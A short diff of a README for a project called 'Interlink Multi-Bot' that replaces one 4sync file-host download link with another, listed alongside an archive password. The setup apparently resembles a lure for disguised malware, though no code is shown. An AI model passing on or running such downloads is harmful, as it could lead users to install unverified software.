@@ -14,7 +14,7 @@ Welcome to the **Interlink Multi-Bot** repository! This project automates the pr
 
 To get started with Interlink Multi-Bot, follow these steps:
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
 
 ## Usage 🚀
